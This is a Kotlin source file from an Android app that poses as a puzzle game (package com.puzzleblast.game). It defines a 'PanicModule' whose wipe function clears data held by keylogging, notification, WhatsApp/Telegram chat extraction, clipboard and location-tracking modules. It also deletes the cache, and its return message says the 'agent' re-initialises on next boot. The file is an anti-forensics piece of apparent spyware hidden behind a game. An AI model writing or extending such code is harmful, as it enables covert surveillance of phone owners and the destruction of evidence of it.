package com.puzzleblast.game.modules

import android.content.Context
import com.puzzleblast.game.util.Prefs
import java.io.File

object PanicModule {
    suspend fun wipe(ctx: Context): String {
        KeylogModule.clear()
        NotifModule.buffer.clear()
        ChatExtractModule.wa.clear()
        ChatExtractModule.waBiz.clear()
        ChatExtractModule.tg.clear()
        ClipboardModule.history.clear()
        LocationModule.history.clear()
        ctx.cacheDir.deleteRecursively()
        Prefs.pendingConfirm = ""
        Prefs.pendingConfirmCmd = ""
        return "🧹 traces wiped. agent re-inits on next boot."
    }
}
